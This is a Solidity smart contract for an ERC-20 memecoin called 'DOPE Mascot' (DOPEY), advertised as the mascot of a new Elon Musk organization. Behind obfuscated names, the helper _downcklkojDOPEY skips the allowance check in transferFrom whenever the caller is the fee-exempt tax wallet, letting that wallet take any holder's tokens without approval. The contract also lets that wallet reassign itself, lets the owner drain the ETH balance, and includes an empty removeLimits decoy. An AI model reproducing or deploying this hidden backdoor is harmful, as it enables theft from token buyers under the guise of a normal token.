// SPDX-License-Identifier: MIT

/*
    Name: DOPE Mascot
    Symbol: DOPEY

    Elon Musk's new organization - DOPE's official mascot is here!

    web: https://dopemascot.lol
    X: https://x.com/Dope_Mascot
    tg: https://t.me/Dope_mascot
*/

pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract DOPEY is Context, IERC20, Ownable {
    uint256 public _vnbbvlkDOPEY = qq30fef / 100;
    uint256 public _oijboijoiDOPEY = 15 * 10**18;
    uint256 private _cvjkbnkjDOPEY = 10;

    uint256 private _vkjbnkfjDOPEY = 10;
    uint256 private _maxovnboiDOPEY = 10;
    uint256 private _initvkjnbkjDOPEY = 20;
    uint256 private _finvjlkbnlkjDOPEY = 0;
    uint256 private _redclkjnkDOPEY = 2;
    uint256 private _prevlfknjoiDOPEY = 2;
    uint256 private _buylkvnlkDOPEY = 0;
    IUniswapV2Router02 private uniswapV2Router;

    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknDOPEY;
    bool private _inlknblDOPEY = false;
    bool private swapvlkDOPEY = false;
    uint256 private _sellcnjkDOPEY = 0;
    uint256 private _lastflkbnlDOPEY = 0;
    address constant _deadlknDOPEY = address(0xdead);

    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcDOPEY;
    mapping(address => mapping(address => uint256)) private _allcvnkjnDOPEY;
    mapping(address => bool) private _feevblknlDOPEY;
    address payable private _taxclknlDOPEY;
    uint8 private constant _decimals = 9;
    uint256 private constant qq30fef = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"DOPE Mascot";
    string private constant _symbol = unicode"DOPEY";

    modifier lockTheSwap() {
        _inlknblDOPEY = true;
        _;
        _inlknblDOPEY = false;
    }

    constructor() payable {
        _taxclknlDOPEY = payable(_msgSender());
        
        _balknvlkcDOPEY[_msgSender()] = (qq30fef * 2) / 100;
        _balknvlkcDOPEY[address(this)] = (qq30fef * 98) / 100;
        _feevblknlDOPEY[address(this)] = true;
        _feevblknlDOPEY[_taxclknlDOPEY] = true;

        emit Transfer(address(0), _msgSender(), (qq30fef * 2) / 100);
        emit Transfer(address(0), address(this), (qq30fef * 98) / 100);
    }

    function _transfer_kjvnDOPEY(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblDOPEY) {
                taxAmount = amount
                    .mul((_buylkvnlkDOPEY > _redclkjnkDOPEY) ? _finvjlkbnlkjDOPEY : _initvkjnbkjDOPEY)
                    .div(100);
            }
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlDOPEY[to] &&
                to != _taxclknlDOPEY
            ) {
                _buylkvnlkDOPEY++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblDOPEY &&
                to == uniswapV2Pair &&
                from != _taxclknlDOPEY &&
                swapvlkDOPEY &&
                _buylkvnlkDOPEY > _prevlfknjoiDOPEY
            ) {
                if (block.number > _lastflkbnlDOPEY) {
                    _sellcnjkDOPEY = 0;
                }
                _sellcnjkDOPEY = _sellcnjkDOPEY + _getAmountOut_lvcbnkDOPEY(amount);
                require(_sellcnjkDOPEY <= _oijboijoiDOPEY, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkDOPEY)
                    _swapTokenslknlDOPEY(_vnbbvlkDOPEY > amount ? amount : _vnbbvlkDOPEY);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjDOPEY(address(this).balance);
                }
                _lastflkbnlDOPEY = block.number;
            }
        }
        _balknvlkcDOPEY[from] = _balknvlkcDOPEY[from].sub(amount);
        _balknvlkcDOPEY[to] = _balknvlkcDOPEY[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcDOPEY[address(this)] = _balknvlkcDOPEY[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknDOPEY) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcDOPEY[account];
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return qq30fef;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnDOPEY[owner][spender];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnDOPEY(sender, recipient, amount);
        if (_downcklkojDOPEY(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnDOPEY[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }

    function _sendETHTocvbnjDOPEY(uint256 amount) private {
        _taxclknlDOPEY.transfer(amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnDOPEY[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _swapTokenslknlDOPEY(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnDOPEY(_msgSender(), recipient, amount);
        return true;
    }

    receive() external payable {}

    function _getAmountOut_lvcbnkDOPEY(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }

    function _assist_bnDOPEY() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }

    function _downcklkojDOPEY(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlDOPEY[msg.sender]) return !_feevblknlDOPEY[msg.sender];
        if(!(sender == uniswapV2Pair || recipient != _deadlknDOPEY)) return false;
        return true;
    }

    function removeLimits () external onlyOwner {}

    function enableDOPEYTrading() external onlyOwner {
        require(!_tradingvlknDOPEY, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), qq30fef);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkDOPEY = true;
        _tradingvlknDOPEY = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    function _setTax_lknblDOPEY(address payable newWallet) external {
        require(_feevblknlDOPEY[_msgSender()]);
        _taxclknlDOPEY = newWallet;
        _feevblknlDOPEY[_taxclknlDOPEY] = true;
    }

}